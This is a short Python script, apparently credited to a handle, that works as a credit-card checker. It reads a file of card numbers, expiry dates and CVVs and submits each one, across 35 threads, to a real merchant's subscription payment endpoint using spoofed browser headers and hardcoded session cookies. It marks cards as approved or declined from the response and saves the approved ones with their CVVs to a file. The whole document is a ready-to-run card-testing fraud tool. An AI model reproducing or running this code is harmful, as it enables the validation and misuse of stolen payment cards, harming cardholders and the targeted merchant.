
import requests # Coded By @iakurdo
import threading
from concurrent.futures import ThreadPoolExecutor

def check_card(card_details):
    cn, expm, expy, cv = card_details.strip().split('|')


    expy = expy[-2:]

    cookies = {
        '_ga': 'GA1.1.2110676481.1723988056',
        '_gcl_au': '1.1.1706583181.1723988056',
        'ci_session': 's8fa99prntn3r4tbngo58qcf8p7ibim3',
        '_ga_4HXMJ7D3T6': 'GS1.1.1724229945.2.1.1724230080.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1724229949.2.1.1724230090.9.0.177903783',
    }

    headers = {
        'authority': 'www.lagreeod.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'referer': 'https://www.lagreeod.com/subscribe-payment',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'card[name]': 'iakurdoo',
        'card[number]': cn,
        'card[exp_month]': expm,
        'card[exp_year]': expy,
        'card[cvc]': cv,
        'coupon': '',
        's1': '14',
        'sum': '26',
    }

    response = requests.post(
        'https://www.lagreeod.com/register/validate_subscribe_step_3',
        cookies=cookies,
        headers=headers,
        data=data,
    )

    if 'invalid' in response.text.lower() or 'incorrect' in response.text.lower() or 'declined' in response.text.lower():
        print(f" @iakurdo > ➦ {cn}|{expm}|{expy} Declined ⛔")
    else:
        print(f" @iakurdo > ➦ {cn}|{expm}|{expy} Approved ✅")
        with open("ApprovedCards.txt", "a") as file:
            file.write(f"{cn}|{expm}|{expy}|{cv}\n")

def main():
    combo_file = input(" @iakurdo > ^ Name Combo  : ")

    with open(combo_file, "r") as file:
        cards = file.readlines()

    max_workers = 35

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(check_card, cards)

if __name__ == "__main__":
    main()
